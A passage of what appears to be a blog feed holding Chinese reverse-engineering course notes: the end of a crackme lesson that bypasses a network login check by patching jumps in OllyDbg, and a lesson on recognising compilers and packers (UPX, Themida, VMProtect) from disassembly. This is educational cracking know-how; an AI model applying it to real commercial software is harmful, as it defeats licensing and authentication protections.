5E</code>。运行，输入账号密码，点击登录。取消断点，F7跟进，一路F8，注意堆栈窗口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00405776   .  E8 D9460000   call 第七课作.00409E54                       ;  获取输入的用户名</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">004057C8   .  E8 87460000   call 第七课作.00409E54                       ;  获取输入的密码</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00405992   . /0F84 7F000000 je 第七课作.00405A17                         ;  要跳</span><br><span class="line">00405998   . |8D45 F8       lea eax,dword ptr ss:[ebp-0x8]</span><br><span class="line">0040599B   . |50            push eax</span><br><span class="line">0040599C   . |E8 A4BEFFFF   call 第七课作.00401845                       ;  账号未找到</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00405AB9   . /0F84 FE000000 je 第七课作.00405BBD                         ;  要跳</span><br><span class="line">...</span><br><span class="line">00405B63   .  68 04000080   push 0x80000004</span><br><span class="line">00405B68   .  6A 00         push 0x0</span><br><span class="line">00405B6A   .  68 14C65500   push 第七课作.0055C614                       ;  err</span><br><span class="line">00405B6F   .  68 04000080   push 0x80000004</span><br><span class="line">00405B74   .  6A 00         push 0x0</span><br><span class="line">00405B76   .  68 18C65500   push 第七课作.0055C618                       ;  signdata</span><br><span class="line">00405B7B   .  68 04000080   push 0x80000004</span><br></pre></td></tr></table></figure><p>改变两个跳转后，F8到这，卡住，暂停+运行，程序弹出不断弹出“用户身份未校验”，还弹出了一个“暗桩”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00405F78   .  E8 D13E0000   call 第七课作.00409E4E</span><br></pre></td></tr></table></figure><p>救命啊我不会！！！</p><hr><p>跟进继续F8，到这又回到按钮事件。重载，跟进这个函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">004087E7  |.  E8 8B030000   call 第七课作.00408B77</span><br></pre></td></tr></table></figure><p>发现跟进这个函数里面的<code>408C3F</code>的call指令又回到按钮事件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00408C3F  |.  E8 D2D6FFFF   call 第七课作.00406316   </span><br></pre></td></tr></table></figure><p>跟进这个函数里面的<code>4063FF</code>的call指令又回到按钮事件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">004063FF  |.  E8 0DB3FFFF   call 第七课作.00401711</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">004087CC  |.  6A FF         push -0x1</span><br><span class="line">004087CE  |.  6A 08         push 0x8</span><br><span class="line">004087D0  |.  68 7A6B0116   push 0x16016B7A</span><br><span class="line">004087D5  |.  68 2B010152   push 0x5201012B</span><br><span class="line">004087DA  |.  E8 63160000   call 第七课作.00409E42</span><br><span class="line">004087DF  |.  83C4 18       add esp,0x18</span><br><span class="line">004087E2  |.  68 00000000   push 0x0</span><br><span class="line">004087E7  |.  E8 8B030000   call 第七课作.00408B77                       ;  暗桩call，跟进</span><br><span class="line">004087EC  |.  68 01000000   push 0x1</span><br><span class="line">004087F1  |.  E8 81030000   call 第七课作.00408B77</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;1-基础知识&quot;&gt;&lt;a href=&quot;#1-基础知识&quot; class=&quot;headerlink&quot; title=&quot;1. 基础知识&quot;&gt;&lt;/a&gt;1. 基础知识&lt;/h1&gt;&lt;h2 id=&quot;1-1-协议&quot;&gt;&lt;a href=&quot;#1-1-协议&quot; class=&quot;headerlink&quot; title=&quot;1.1 协议&quot;&gt;&lt;/a&gt;1.1 协议&lt;/h2&gt;&lt;p&gt;网络验证协议分为UDP和TCP协议。&lt;/p&gt;
&lt;p&gt;目前市面上流行的网络验证一半都是TCP协议的。&lt;/p&gt;
&lt;p&gt;采用TCP协议程序发送数据所用API为：send，接收数据所用API为：recv&lt;/p&gt;
&lt;p&gt;采用UDP协议程序发送数据所用API为：WSASend，接收数据所用API为：WSARecv&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="OllyDbg" scheme="http://example.com/tags/OllyDbg/"/>
    
    <category term="吾爱破解培训" scheme="http://example.com/tags/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD/"/>
    
  </entry>
  
  <entry>
    <title>第一课——脱壳基础</title>
    <link href="http://example.com/posts/e2d652c5.html"/>
    <id>http://example.com/posts/e2d652c5.html</id>
    <published>2022-04-05T01:29:28.072Z</published>
    <updated>2022-04-11T05:26:14.459Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-程序是什么语言编译的"><a href="#1-程序是什么语言编译的" class="headerlink" title="1. 程序是什么语言编译的"></a>1. 程序是什么语言编译的</h1><p>从目前国内接触到程序看，比较流行的编译器有：VC系列、易语言、.NET、Delphi，一些曾经用的很多但渐渐少了有：VB、ASM、BC++，还有一些用的比较少的有：AutoIt、PB、QT等，下面提供一些实例，结合实例来看看“入口点代码”、“程序区段”和“加载模块”等特征。</p><span id="more"></span><h2 id="1-1-VC6"><a href="#1-1-VC6" class="headerlink" title="1.1 VC6"></a>1.1 VC6</h2><img src="/posts/e2d652c5/VC6.png" class="" title="VC6"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00401700 &gt;/$  55            push ebp</span><br><span class="line">00401701  |.  8BEC          mov ebp,esp</span><br><span class="line">00401703  |.  6A FF         push -0x1</span><br><span class="line">00401705  |.  68 00254000   push 吾爱破解.00402500</span><br></pre></td></tr></table></figure><p>VC6特点：入口点代码是固定的代码，入口调用的API也是相同的，其中有的push地址不同程序可能会有所不同；区段有四个也是固定的.text、.rdata、.data和.rsrc。</p><h2 id="1-2-VS2008与VS2013"><a href="#1-2-VS2008与VS2013" class="headerlink" title="1.2 VS2008与VS2013"></a>1.2 VS2008与VS2013</h2><img src="/posts/e2d652c5/VS2008.png" class="" title="VS2008"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00B5DDAC &gt; $  E8 EF4E0000   call 吾爱破解.00B62CA0</span><br><span class="line">00B5DDB1   .^ E9 79FEFFFF   jmp 吾爱破解.00B5DC2F</span><br></pre></td></tr></table></figure><img src="/posts/e2d652c5/VS2013.png" class="" title="VS2013"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00B03359 &gt; $  E8 A9520000   call 吾爱破解.00B08607</span><br><span class="line">00B0335E   .^ E9 7FFEFFFF   jmp 吾爱破解.00B031E2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00B08607  /$  55            push ebp</span><br><span class="line">00B08608  |.  8BEC          mov ebp,esp</span><br></pre></td></tr></table></figure><p>VS特点：入口点只有两行代码，一个CALL后直接JMP，第一个CALL进去后调用的API也是相同的；区段相对于VC6多了一个.reloc。</p><h2 id="1-3-易语言"><a href="#1-3-易语言" class="headerlink" title="1.3 易语言"></a>1.3 易语言</h2><p>易语言编译无壳程序分为独立编译和非独立编译。由于易语言<strong>独立编译</strong>是调用VC的链接程序编译的，所以从区段和入口代码特征和VC相同，用exeinfoPE查壳也显示是VC6编译的。而<strong>非独立编译</strong>却显示不知名EXE，可能查壳工具里面没有存易语言非独立编译的特征码吧。</p><img src="/posts/e2d652c5/%E6%98%93%E8%AF%AD%E8%A8%80%E9%9D%9E%E7%8B%AC%E7%AB%8B%E7%BC%96%E8%AF%91.png" class="" title="易语言非独立编译"><img src="/posts/e2d652c5/%E6%98%93%E8%AF%AD%E8%A8%80.png" class="" title="易语言"><p>易语言特点：从程序里找一些call调用，最终都会走到上面位置（文字不太好表达），这个方法可以区分易语言和VC，非独立编译比较容易识别，入口处和<code>E</code>模块都可以找到<code>krnln.fnr</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">00401000 &gt;/$  E8 89000000                                        call 吾爱破解.0040108E</span><br><span class="line">00401005  |.  50                                                 push eax                                 ; /ExitCode = 0x0</span><br><span class="line">00401006  \.  E8 B5010000                                        call &lt;jmp.&amp;KERNEL32.ExitProcess&gt;         ; \ExitProcess</span><br><span class="line">0040100B   .  47 65 74 4E 65 77 53 6F 63 6B 00                   ascii &quot;GetNewSock&quot;,0</span><br><span class="line">00401016   .  45 72 72 6F 72 00                                  ascii &quot;Error&quot;,0</span><br><span class="line">0040101C   .  6B 72 6E 6C 6E 2E 66 6E 65 00                      ascii &quot;krnln.fne&quot;,0</span><br><span class="line">00401026   .  4E 6F 74 20 66 6F 75 6E 64 20 74 68 65 20 6B 65    ascii &quot;Not found the ke&quot;</span><br><span class="line">00401036   .  72 6E 65 6C 20 6C 69 62 72 61 72 79 20 6F 72 20    ascii &quot;rnel library or &quot;</span><br><span class="line">00401046   .  74 68 65 20 6B 65 72 6E 65 6C 20 6C 69 62 72 61    ascii &quot;the kernel libra&quot;</span><br><span class="line">00401056   .  72 79 20 69 73 20 69 6E 76 61 6C 69 64 21 00       ascii &quot;ry is invalid!&quot;,0</span><br><span class="line">00401065   .  6B 72 6E 6C 6E 2E 66 6E 72 00                      ascii &quot;krnln.fnr&quot;,0</span><br><span class="line">0040106F   .  50 61 74 68 00                                     ascii &quot;Path&quot;,0</span><br><span class="line">00401074   .  53 6F 66 74 77 61 72 65 5C 46 6C 79 53 6B 79 5C    ascii &quot;Software\FlySky\&quot;</span><br><span class="line">00401084   .  45 5C 49 6E 73 74 61 6C 6C 00                      ascii &quot;E\Install&quot;,0</span><br><span class="line">0040108E  /$  55                                                 push ebp</span><br><span class="line">0040108F  |.  8BEC                                               mov ebp,esp</span><br><span class="line">00401091  |.  81C4 F0FEFFFF                                      add esp,-0x110</span><br><span class="line">00401097  |.  8D85 FCFEFFFF                                      lea eax,[local.65]</span><br><span class="line">0040109D  |.  50                                                 push eax</span><br><span class="line">0040109E  |.  E8 41010000                                        call 吾爱破解.004011E4</span><br><span class="line">004010A3  |.  68 65104000                                        push 吾爱破解.00401065                       ; /StringToAdd = &quot;krnln.fnr&quot;</span><br><span class="line">004010A8  |.  8D85 FCFEFFFF                                      lea eax,[local.65]                       ; |</span><br><span class="line">004010AE  |.  50                                                 push eax                                 ; |ConcatString = NULL</span><br><span class="line">004010AF  |.  E8 24010000                                        call &lt;jmp.&amp;KERNEL32.lstrcatA&gt;            ; \lstrcatA</span><br></pre></td></tr></table></figure><h2 id="1-4-Delphi"><a href="#1-4-Delphi" class="headerlink" title="1.4 Delphi"></a>1.4 Delphi</h2><img src="/posts/e2d652c5/Delphi.png" class="" title="Delphi"><p>Delphi特点：非常多的call指令，并且<code>push address</code>与<code>retn</code>结合相当于<code>jmp address</code>。比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push 004A52F4</span><br><span class="line">……</span><br><span class="line">retn</span><br><span class="line">;相当于jmp 004A52F4</span><br></pre></td></tr></table></figure><h2 id="1-5-BC"><a href="#1-5-BC" class="headerlink" title="1.5 BC++"></a>1.5 BC++</h2><img src="/posts/e2d652c5/BC++6.png" class="" title="BC++6"><img src="/posts/e2d652c5/BC++2010.png" class="" title="BC++2010"><p>BC++6与BC++2010都差不多，入口处一样的机器码，接下来调用获取句柄的API函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">004014EC &gt; $ /EB 10         jmp short 吾爱破解.004014FE</span><br><span class="line">004014EE     |66            db 66                                    ;  CHAR &#x27;f&#x27;</span><br><span class="line">004014EF     |62            db 62                                    ;  CHAR &#x27;b&#x27;</span><br><span class="line">004014F0     |3A            db 3A                                    ;  CHAR &#x27;:&#x27;</span><br><span class="line">004014F1     |43            db 43                                    ;  CHAR &#x27;C&#x27;</span><br><span class="line">004014F2     |2B            db 2B                                    ;  CHAR &#x27;+&#x27;</span><br><span class="line">004014F3     |2B            db 2B                                    ;  CHAR &#x27;+&#x27;</span><br><span class="line">004014F4     |48            db 48                                    ;  CHAR &#x27;H&#x27;</span><br><span class="line">004014F5     |4F            db 4F                                    ;  CHAR &#x27;O&#x27;</span><br><span class="line">004014F6     |4F            db 4F                                    ;  CHAR &#x27;O&#x27;</span><br><span class="line">004014F7     |4B            db 4B                                    ;  CHAR &#x27;K&#x27;</span><br><span class="line">004014F8     |90            nop</span><br><span class="line">004014F9     |E9            db E9</span><br><span class="line">004014FA   . |ACB04C00      dd offset 吾爱破解.___CPPdebugHook</span><br><span class="line">004014FE   &gt; \A1 9FB04C00   mov eax,dword ptr ds:[0x4CB09F]</span><br><span class="line">00401503   .  C1E0 02       shl eax,0x2</span><br><span class="line">00401506   .  A3 A3B04C00   mov dword ptr ds:[0x4CB0A3],eax</span><br><span class="line">0040150B   .  52            push edx                                 ;  吾爱破解.&lt;ModuleEntryPoint&gt;</span><br><span class="line">0040150C   .  6A 00         push 0x0                                 ; /pModule = NULL</span><br><span class="line">0040150E   .  E8 578F0C00   call &lt;jmp.&amp;KERNEL32.GetModuleHandleA&gt;    ; \GetModuleHandleA</span><br></pre></td></tr></table></figure><h2 id="1-6-ASM"><a href="#1-6-ASM" class="headerlink" title="1.6 ASM"></a>1.6 ASM</h2><img src="/posts/e2d652c5/ASM.png" class="" title="ASM"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0040108B &gt;/$  6A 00            push 0x0                                 ; /pModule = NULL</span><br><span class="line">0040108D  |.  E8 4A000000      call &lt;jmp.&amp;kernel32.GetModuleHandleA&gt;    ; \GetModuleHandleA</span><br></pre></td></tr></table></figure><p>ASM特点：用汇编编写的程序都非常小，基本很少遇到，但它可用于改变自身代码，某些病毒就是利用多态和变形的特点隐藏自身。具体可见《OD使用教程》中的多态和变形。</p><h2 id="1-7-NET"><a href="#1-7-NET" class="headerlink" title="1.7 .NET"></a>1.7 .NET</h2><img src="/posts/e2d652c5/NET.png" class="" title="NET"><p>.NET编译的程序放在OD调试会出现错误，推荐使用专门的net反编译工具。 </p><img src="/posts/e2d652c5/NET_OD.png" class="" title="NET_OD"><h2 id="1-8-AutoIt"><a href="#1-8-AutoIt" class="headerlink" title="1.8 AutoIt"></a>1.8 AutoIt</h2><img src="/posts/e2d652c5/AutoIt.png" class="" title="AutoIt"><p>在OD中文搜索引擎可以看到它是用AutoIt v3编译的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">中文搜索引擎, 条目 504</span><br><span class="line"> 地址=0014A9F1</span><br><span class="line"> 反汇编=push 吾爱破解.001E26A8</span><br><span class="line"> 文本字符串=AutoIt v3 GUI</span><br></pre></td></tr></table></figure><h2 id="1-9-PB"><a href="#1-9-PB" class="headerlink" title="1.9 PB"></a>1.9 PB</h2><img src="/posts/e2d652c5/PB.png" class="" title="PB"><p>PB可能也是跟易语言的独立编译一样，调用VC的链接程序编译，所以才显示VC6。但它还另加了两个库：<code>libjcc.dll</code>和<code>pbvm90.dll</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Executable modules</span><br><span class="line">基址       大小       入口       名称       文件版本          路径</span><br><span class="line">009E0000   0007C000   00A10640   libjcc     4.2.5.06          F:\吾爱破解培训\吾爱破解培训第一课例子\无壳程序\libjcc.dll</span><br><span class="line">10000000   0000B000   10001B30   吾爱破解       1,0,0,1           F:\吾爱破解培训\吾爱破解培训第一课例子\无壳程序\吾爱破解论坛学习脱壳实例_PB.exe</span><br><span class="line">10B00000   003F3000   10DB9000   pbvm90     9.0.3.8784        F:\吾爱破解培训\吾爱破解培训第一课例子\无壳程序\pbvm90.dll</span><br></pre></td></tr></table></figure><h2 id="1-10-QT"><a href="#1-10-QT" class="headerlink" title="1.10 QT"></a>1.10 QT</h2><img src="/posts/e2d652c5/QT.png" class="" title="QT"><p>查壳可看到QT编译，并且OD的<code>E</code>模块也看到了有关QT的库。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Executable modules</span><br><span class="line">基址       大小       入口       名称       文件版本          路径</span><br><span class="line">00400000   0000D000   004014C0   52pojie    0.0.0.0           F:\吾爱破解培训\吾爱破解培训第一课例子\无壳程序\52破解脱壳实例\52pojie.exe</span><br><span class="line">01090000   00633000   01091420   Qt5Widge   5.4.1.0           F:\吾爱破解培训\吾爱破解培训第一课例子\无壳程序\52破解脱壳实例\Qt5Widgets.dll</span><br><span class="line">016D0000   002AD000   016D1420   icuin53                      F:\吾爱破解培训\吾爱破解培训第一课例子\无壳程序\52破解脱壳实例\icuin53.dll</span><br><span class="line">61940000   00505000   61941420   Qt5Gui     5.4.1.0           F:\吾爱破解培训\吾爱破解培训第一课例子\无壳程序\52破解脱壳实例\Qt5Gui.dll</span><br><span class="line">64940000   00014000   64941420   libwinpt   1, 0, 0, 0        F:\吾爱破解培训\吾爱破解培训第一课例子\无壳程序\52破解脱壳实例\libwinpthread-1.dll</span><br><span class="line">66500000   01499000   66501420   icudt53                      F:\吾爱破解培训\吾爱破解培训第一课例子\无壳程序\52破解脱壳实例\icudt53.dll</span><br><span class="line">68430000   0003F000   68462D70   glu32      10.0.19041.1288   C:\Windows\SysWOW64\glu32.dll</span><br><span class="line">68880000   004A6000   68881420   Qt5Core    5.4.1.0           F:\吾爱破解培训\吾爱破解培训第一课例子\无壳程序\52破解脱壳实例\Qt5Core.dll</span><br><span class="line">68F80000   001B3000   68F81420   icuuc53                      F:\吾爱破解培训\吾爱破解培训第一课例子\无壳程序\52破解脱壳实例\icuuc53.dll</span><br><span class="line">694A0000   00103000   69573D60   opengl32   10.0.19041.1081   C:\Windows\SysWOW64\opengl32.dll</span><br><span class="line">6C640000   0009F000   6C678870   apphelp    10.0.19041.1288   C:\Windows\SysWOW64\apphelp.dll</span><br><span class="line">6E940000   00024000   6E941420   libgcc_s                     F:\吾爱破解培训\吾爱破解培训第一课例子\无壳程序\52破解脱壳实例\libgcc_s_dw2-1.dll</span><br><span class="line">6FC40000   00101000   6FC41420   libstdc+                     F:\吾爱破解培训\吾爱破解培训第一课例子\无壳程序\52破解脱壳实例\libstdc++-6.dll</span><br></pre></td></tr></table></figure><h2 id="1-11-VB"><a href="#1-11-VB" class="headerlink" title="1.11 VB"></a>1.11 VB</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0040129A  - FF25 AC104000   jmp dword ptr ds:[&lt;&amp;msvbvm60.#ThunRTMain_100&gt;]            ; msvbvm60.ThunRTMain</span><br><span class="line">004012A0 &gt;  68 582E4000     push dumped_.00402E58</span><br><span class="line">004012A5    E8 F0FFFFFF     call &lt;jmp.&amp;msvbvm60.#ThunRTMain_100&gt;</span><br></pre></td></tr></table></figure><h1 id="2-如何判断是否加壳"><a href="#2-如何判断是否加壳" class="headerlink" title="2. 如何判断是否加壳"></a>2. 如何判断是否加壳</h1><ol><li>通过查壳工具中内置各种壳的十六进制特征码进行对比查壳</li><li>通过程序入口特征与区段信息来判断</li></ol><h1 id="3-程序加的是什么壳"><a href="#3-程序加的是什么壳" class="headerlink" title="3. 程序加的是什么壳"></a>3. 程序加的是什么壳</h1><p>未加壳、压缩壳、传统加密壳、代码虚拟化保护、.Net程序加密…</p><h2 id="3-1-压缩壳"><a href="#3-1-压缩壳" class="headerlink" title="3.1 压缩壳"></a>3.1 压缩壳</h2><p>尽量减少可执行文件的大小。</p><h3 id="3-1-1-ASPacK"><a href="#3-1-1-ASPacK" class="headerlink" title="3.1.1 ASPacK"></a>3.1.1 ASPacK</h3><img src="/posts/e2d652c5/ASPacK.png" class="" title="ASPacK"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00803001 &gt;  60              pushad</span><br></pre></td></tr></table></figure><p>看到<code>m</code>模块，除了最基本VS编译特点的区段，ASPacK壳还加了<code>.aspack</code>与<code>.adata</code>模块，这两个模块都可以在加壳时自定义名字。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Memory map</span><br><span class="line">地址       大小       属主       区段       包含                         类型   访问     初始访问  已映射为</span><br><span class="line">007B0000   00001000   吾爱破解                  PE 文件头                     Imag   R         RWE</span><br><span class="line">007B1000   00031000   吾爱破解       .text      代码                         Imag   R       RWE</span><br><span class="line">007E2000   0000D000   吾爱破解       .rdata     数据                          Imag   R       RWE</span><br><span class="line">007EF000   00007000   吾爱破解       .data                                   Imag   R         RWE</span><br><span class="line">007F6000   00004000   吾爱破解       .rsrc      资源                          Imag   R       RWE</span><br><span class="line">007FA000   00009000   吾爱破解       .reloc                                  Imag   R         RWE</span><br><span class="line">00803000   00003000   吾爱破解       .aspack    SFX,输入表                    Imag   R         RWE</span><br><span class="line">00806000   00001000   吾爱破解       .adata                                  Imag   R         RWE</span><br></pre></td></tr></table></figure><h3 id="3-1-2-UPX"><a href="#3-1-2-UPX" class="headerlink" title="3.1.2 UPX"></a>3.1.2 UPX</h3><img src="/posts/e2d652c5/UPX.png" class="" title="UPX"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00287170 &gt; $  60            pushad</span><br></pre></td></tr></table></figure><h2 id="3-2-加密壳"><a href="#3-2-加密壳" class="headerlink" title="3.2 加密壳"></a>3.2 加密壳</h2><p>抵抗各类调试器和逆向，可能会加入大量干扰代码。</p><h3 id="3-2-1-Themida"><a href="#3-2-1-Themida" class="headerlink" title="3.2.1 Themida"></a>3.2.1 Themida</h3><img src="/posts/e2d652c5/Themida.png" class="" title="Themida"><p>从查壳工具看到它有个区段没名字，并且最后两段是随机名称。而且它与其他加壳的入口处不一样，不是<code>pushad</code>而是三个push</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00AC4000 &gt;  56              push esi                                 ; 吾爱破解.&lt;ModuleEntryPoint&gt;</span><br><span class="line">00AC4001    50              push eax</span><br><span class="line">00AC4002    53              push ebx</span><br><span class="line">00AC4003    E8 01000000     call 吾爱破解.00AC4009</span><br><span class="line">00AC4008    CC              int3</span><br></pre></td></tr></table></figure><p>但F8运行一段后也是可以发现有<code>pushad</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">008BC76D    89E8            mov eax,ebp</span><br><span class="line">008BC76F    89E2            mov edx,esp</span><br><span class="line">008BC771    60              pushad</span><br><span class="line">008BC772    E8 00000000     call 吾爱破解.008BC777</span><br></pre></td></tr></table></figure><h3 id="3-2-2-VMProtect"><a href="#3-2-2-VMProtect" class="headerlink" title="3.2.2 VMProtect"></a>3.2.2 VMProtect</h3><img src="/posts/e2d652c5/VMProtect.png" class="" title="VMProtect"><p>可看VMProtect有很多个段，一些段的首字节显示<code>ZERO SIZE</code>。载入OD代码看起来也很乱</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">007433CC    E8 F6EFFCFF     call 吾爱破解.007123C7</span><br><span class="line">007433D1    48              dec eax</span><br><span class="line">007433D2    DE1F            ficomp word ptr ds:[edi]</span><br><span class="line">007433D4    ff5e 43         call far fword ptr ds:[esi+0x43]</span><br><span class="line">007433D7    29F0            sub eax,esi</span><br><span class="line">007433D9    3950 3F         cmp dword ptr ds:[eax+0x3F],edx          ; 吾爱破解.00610000</span><br><span class="line">007433DC    16              push ss</span><br><span class="line">007433DD    17              pop ss</span><br><span class="line">007433DE    F8              clc</span><br></pre></td></tr></table></figure><p>进入第一个函数可以看到类似于加密的<code>pushfd</code>标志吧。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">007123C7    9C              pushfd</span><br><span class="line">007123C8    9C              pushfd</span><br><span class="line">007123C9    C74424 08 1F660&gt;mov dword ptr ss:[esp+0x8],0xA00A661F</span><br><span class="line">007123D1    9C              pushfd</span><br><span class="line">007123D2    E9 B58D0000     jmp 吾爱破解.0071B18C</span><br></pre></td></tr></table></figure><h3 id="3-2-3-Shielden"><a href="#3-2-3-Shielden" class="headerlink" title="3.2.3 Shielden"></a>3.2.3 Shielden</h3><img src="/posts/e2d652c5/Shielden.png" class="" title="Shielden"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0050B119 &gt; $ /EB 08         jmp short 吾爱破解.0050B123</span><br><span class="line">0050B11B     |00            db 00</span><br><span class="line">0050B11C     |C8            db C8</span><br><span class="line">0050B11D     |10            db 10</span><br><span class="line">0050B11E     |00            db 00</span><br><span class="line">0050B11F     |00            db 00</span><br><span class="line">0050B120     |00            db 00</span><br><span class="line">0050B121     |00            db 00</span><br><span class="line">0050B122     |00            db 00</span><br><span class="line">0050B123   &gt;^\E9 E5F2FFFF   jmp 吾爱破解.0050A40D</span><br><span class="line">0050B128   .  1978 5B       sbb dword ptr ds:[eax+0x5B],edi          ;  吾爱破解.&lt;ModuleEntryPoint&gt;</span><br><span class="line">0050B12B   &gt;  0f93c3        setae bl</span><br><span class="line">0050B12E   .  FEC1          inc cl</span><br><span class="line">0050B130   .  8BDE          mov ebx,esi                              ;  吾爱破解.&lt;ModuleEntryPoint&gt;</span><br><span class="line">0050B132   .  60            pushad</span><br><span class="line">0050B133   .  F6DF          neg bh</span><br></pre></td></tr></table></figure><p>F8走几下，也能看到明显的Shielden加壳特征。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td 